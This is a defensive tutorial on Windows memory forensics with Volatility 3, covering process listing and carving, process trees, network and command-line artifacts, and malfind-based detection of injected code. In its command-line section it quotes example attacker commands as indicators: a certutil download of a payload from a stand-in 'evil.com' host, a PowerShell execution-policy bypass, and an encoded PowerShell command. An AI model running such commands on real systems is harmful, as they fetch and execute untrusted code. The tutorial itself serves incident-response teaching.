# Memory Forensics (Volatility)

## Introduction to Volatility

Volatility is the world's most widely used, open-source memory forensics framework. Written in Python, it allows investigators to analyze RAM captures (.raw, .vmem, .dmp) offline to reconstruct the exact state of a computer at the moment the memory was captured.

### Volatility 2 vs Volatility 3

- Volatility 2: The traditional version (Python 2). It requires the analyst to manually specify a "Profile" (the exact OS version, e.g., Win7SP1x64) before it can parse the memory image. If you guess the wrong profile, Volatility returns gibberish.
- Volatility 3: The modern version (Python 3). It largely eliminates the need for manual profiles. Instead, it downloads "Symbol Tables" from Microsoft on the fly to automatically figure out the OS version and parse the structures.

### Basic Syntax (Volatility 3)

The syntax for Volatility 3 is straight-forward: you run the `vol.py` script, provide the target memory image using -f, and then specify a plugin.

A plugin is a specific script that looks for a specific artifact in memory.

Syntax: `python3 vol.py -f <memory_image> <plugin_name>`

Example: `python3 vol.py -f infected_laptop.raw windows.info`

### The 'windows.info' Plugin

The absolute first plugin you should run on any new memory image is `windows.info`.

- What it does: It analyzes the basic header structures of the memory image to determine the exact Operating System version, the primary architecture (32-bit vs 64-bit), the exact build number, and the time the memory image was created.
- Forensic Value: It proves the memory image is sound and readable, and gives you the exact timestamp of the acquisition, which is perfectly aligned toUTC time (unlike disk timestamps which might be affected by local timezones).


## Process Enumeration

### windows.pslist (The Honest List)

To understand what is running, the Windows Kernel maintains a linked list called the EPROCESS block list (specifically the ActiveProcessLinks). Whenever you open Task Manager, Windows simply walks down this list and displays the results.

The `windows.pslist` plugin does exactly the same thing. It asks the OS, "What processes do you think are running?"

- Syntax: `python3 vol.py -f image.raw windows.pslist`
- Output: Process Name, Process ID (PID), Parent Process ID (PPID), Threads, Handles, and Creation Time.

The Problem: Because `pslist` relies on the linked list maintained by the OS, it is highly susceptible to Rootkits. A rootkit can simply digitally unlink its malicious process from the `ActiveProcessLinks` list. To the OS (and Task Manager, and `pslist`), the malware suddenly becomes invisible, even though it is still actively executing in memory.

### windows.psscan (The Skeptical Scanner)

To find hidden processes, we use Memory Carving.

Instead of trusting the linked list, `windows.psscan` ignores the OS entirely. It methodically scans every single byte of the massive RAM file, looking for the specific byte-signature that signifies the start of an `EPROCESS` data structure.

- Syntax: `python3 vol.py -f image.raw windows.psscan`
- The Power of Carving: If a rootkit unlinks itself to hide, `psscan` will still find it, because the actual data structure must still exist in RAM for the malware to run.
- Bonus Power: Because it scans memory raw, `psscan` can even find processes that were recently terminated (closed) but whose data hasn't yet been overwritten by new data.

### The Comparison Technique

How do you find the hidden rootkit? You run `pslist`. You run `psscan`. Then you compare the outputs. If a process shows up in `psscan` but is absent from `pslist`, you have found a process that was deliberately unlinked and hidden. That PID is almost certainly malicious.

### windows.pstree (The Family Tree)

Attackers often name their malware something innocent, like `svchost.exe`. How do you spot the fake?

`windows.pstree` organizes processes by their Parent-Child relationships.

- Normal: `services.exe` spawns a dozen `svchost.exe` processes.
- Malicious: You see `explorer.exe` (the desktop GUI) spawning a `svchost.exe`. Or a `winword.exe` (Microsoft Word) spawning `cmd.exe` or `powershell.exe`. The parent-child relationship instantly gives away the attacker.


## Network and Command Line Analysis in RAM

### windows.netscan

Just because malware is hidden doesn't mean it operates in a vacuum. It must communicate with the attacker's Command and Control (C2) server.

The `windows.netscan` plugin scans RAM for network artifact structures (similar to how `psscan` looks for processes).

- Syntax: `python3 vol.py -f image.raw windows.netscan`
- Output:
    - Protocol: TCP/UDP
    - Local Address & Port
    - Foreign Address & Port: The external IP the machine is talking to.
    - State: ESTABLISHED, LISTENING, CLOSED, etc.
    - Owner (PID): The Process ID responsible for the connection.
- Forensic Value: If you see an unknown IP address communicating over port 443 (HTTPS), you can check the "Owner PID". You might discover that a seemingly innocent notepad.exe is actively holding open an encrypted tunnel to Russia. That is an immediate indicator of compromise.

### windows.cmdline

Windows allows you to launch programs with specific arguments (e.g., instead of just double-clicking a script, an attacker runs `powershell.exe -ExecutionPolicy Bypass -File evil.ps1`).

These arguments might be the only place the attacker's true intent is visible. Even if the process completes and terminates, the command-line arguments often linger in memory.

- Syntax: `python3 vol.py -f image.raw windows.cmdline`
- Forensic Value: This plugin prints out the exact command-line string used to launch every process found in memory.
- What to look for:
    - Encoded Commands: `powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0...` (Base64 encoded commands are a massive red flag).
    - Suspicious Paths: `cmd.exe /c start C:\Users\Public\malware.exe`
    - Living off the Land: Using legitimate Windows tools for malicious purposes (e.g., `certutil.exe -urlcache -split -f http://evil.com/payload.exe`).


## Hunting Advanced Malware (Malfind)

If an attacker is somewhat sophisticated, they won't even leave an `evil.exe` running on the system. Instead, they will use Code Injection.

They will take malicious payload code and inject it directly into the memory space of a completely legitimate process, like the real, Microsoft-signed `explorer.exe` (the taskbar). If you check `pslist`, `explorer.exe` looks fine. If you check `netscan`, `explorer.exe` is talking to the internet (which is suspicious, but not definitive proof).

### Memory Protections (VAD - Virtual Address Descriptor)

To understand injection, you must understand how Windows protects memory. Windows assigns permissions to blocks of memory using a structure called the Virtual Address Descriptor (VAD).

- PAGE_READONLY: The program can read this memory, but not change it.
- PAGE_READWRITE (RW): The program can store variables and data here.
- PAGE_EXECUTE_READ (RX): The memory contains actual CPU instructions (code) that are allowed to run.

The Golden Rule: Data should be RW. Code should be RX. It is a massive security risk to allow memory to be both writable AND executable at the same time: PAGE_EXECUTE_READWRITE (RWX). If a block of memory is RWX, an attacker can write malicious code into it, and then instantly execute it. Modern Windows compiles very few programs with RWX permissions.

### windows.malfind

The `windows.malfind` plugin is the ultimate malware hunter.

It ignores the names of processes. It ignores parent-child relationships. Instead, it scans the Virtual Address Descriptor (VAD) of every single process, looking for memory regions marked as PAGE_EXECUTE_READWRITE (RWX).

If it finds an RWX section, it then checks if there is an unbacked executable (a program in memory that does not correspond to a physical file on the hard drive).

- Syntax: `python3 vol.py -f image.raw windows.malfind`
- Output: For every hit, it prints the Process Name, the PID, the starting memory address of the injected code, and a hex dump of the first few bytes of that injected code.
- What to look for in the Hex Dump:
    - 4D 5A (MZ) - These are the magic bytes that signify a Windows Executable (PE file).
    - If you see a legitimate process like `svchost.exe`, and `malfind` highlights a memory region marked RWX that starts with 4D 5A, you have found a reverse shell or beacon fully injected into that process.

### Extracting the Malware

Once `malfind` or `pslist` identifies a malicious PID, you can extract the malware out of the RAM image and save it to your forensic workstation for reverse engineering.

- windows.pslist --pid <PID> --dump: Dumps the entire executable of a running process.
- windows.malfind --pid <PID> --dump: Dumps specifically the hidden, injected code sections identified by the malfind plugin.